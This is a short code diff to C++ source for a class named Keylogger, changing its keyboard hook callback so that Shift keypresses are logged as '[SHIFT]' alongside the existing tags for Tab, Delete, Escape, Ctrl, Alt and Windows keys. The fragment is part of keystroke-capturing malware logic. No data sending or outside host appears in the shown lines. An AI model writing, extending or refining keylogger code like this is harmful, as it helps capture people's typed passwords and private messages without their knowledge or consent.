@@ -33,7 +33,7 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
         else if (key == VK_TAB) append("[TAB]");
         else if (key == VK_DELETE) append("[DEL]");
         else if (key == VK_ESCAPE) append("[ESC]");
-        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {}
+        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) append("[SHIFT]");
         else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) append("[CTRL]");
         else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) append("[ALT]");
         else if (key == VK_LWIN || key == VK_RWIN) append("[WIN]");
